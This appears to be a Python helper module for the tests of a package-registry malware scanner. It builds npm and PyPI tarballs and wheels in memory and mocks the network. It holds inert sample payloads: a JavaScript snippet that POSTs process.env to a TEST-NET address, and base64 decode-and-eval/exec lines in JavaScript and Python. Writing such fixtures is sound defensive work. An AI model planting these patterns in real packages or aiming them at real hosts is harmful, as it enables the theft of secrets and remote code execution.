"""Helpers for the test_review_*.py registry tests: archives built in memory,
scan_package driven with the network seam patched. Nothing here is a test.

Every "hostile" payload is inert text: network references use 192.0.2.x
(TEST-NET) or .invalid hosts, and nothing is ever extracted or executed."""

import gzip
import io
import json
import stat
import tarfile
import zipfile
from unittest import mock

from lazaret.registry import repo

EXFIL_JS = ("const https = require('https');\n"
            "const body = JSON.stringify(process.env);\n"
            "https.request({host: '192.0.2.1', method: 'POST'}).end(body);\n")
DECODE_EXEC_JS = "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());\n"
DECODE_EXEC_PY = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 200


def manifest(**fields):
    """package.json text; scripts=... etc. as keyword arguments."""
    data = {"name": "x", "version": "1.0.0"}
    data.update(fields)
    return json.dumps(data, indent=2, ensure_ascii=False)


def hooks(**scripts):
    return manifest(scripts=scripts)


def tar_member(name, data=b"", typ=tarfile.REGTYPE, linkname=""):
    """One raw ustar member (header + padded data)."""
    if isinstance(data, str):
        data = data.encode()
    ti = tarfile.TarInfo(name)
    ti.type = typ
    ti.linkname = linkname
    ti.mode = 0o644
    ti.size = len(data) if typ in (tarfile.REGTYPE, tarfile.AREGTYPE) else 0
    out = ti.tobuf(tarfile.USTAR_FORMAT)
    if ti.size:
        out += data + b"\0" * (-len(data) % 512)
    return out


def tarball(files, root="package/", compress=True):
    """{path: str|bytes} -> .tgz bytes (members under `root`). A value that is
    a (typ, linkname) tuple makes a link member."""
    raw = b""
    for path, content in files.items():
        if isinstance(content, tuple):
            raw += tar_member(root + path, b"", content[0], content[1])
        else:
            raw += tar_member(root + path, content)
    raw += b"\0" * 1024
    return gzip.compress(raw) if compress else raw


def zipball(files, symlinks=None):
    """{path: str|bytes} -> zip bytes; symlinks {path: target} are stored the
    way zip/Info-ZIP stores them (S_IFLNK mode, target as the content)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for path, content in files.items():
            zf.writestr(path, content)
        for path, target in (symlinks or {}).items():
            info = zipfile.ZipInfo(path)
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            zf.writestr(info, target)
    return buf.getvalue()


def scan_bytes(data, container="tgz", artifact="npm", eco="npm", full=False, **kw):
    rv = ("1.0.0", "https://registry.npmjs.org/x/-/x-1.0.0.tgz", container, artifact, {})
    with mock.patch.object(repo, "resolve_npm", return_value=rv), \
            mock.patch.object(repo, "resolve_pypi", return_value=rv), \
            mock.patch.object(repo, "http_bytes", return_value=data), \
            mock.patch.object(repo, "verify_digest", return_value=None):
        return repo.scan_package(eco, "x", full=full, **kw)


def scan_npm(files, **kw):
    return scan_bytes(tarball(files), **kw)


def scan_sdist(files, root="x-1.0/", **kw):
    return scan_bytes(tarball(files, root=root), artifact="sdist", eco="pypi", **kw)


def scan_wheel(files, symlinks=None, **kw):
    return scan_bytes(zipball(files, symlinks), container="zip", artifact="wheel", eco="pypi", **kw)


def rules(res, sevs=None):
    return {i["rule"] for i in res["issues"] if sevs is None or i["sev"] in sevs}


def issues(res, rule):
    return [i for i in res["issues"] if i["rule"] == rule]
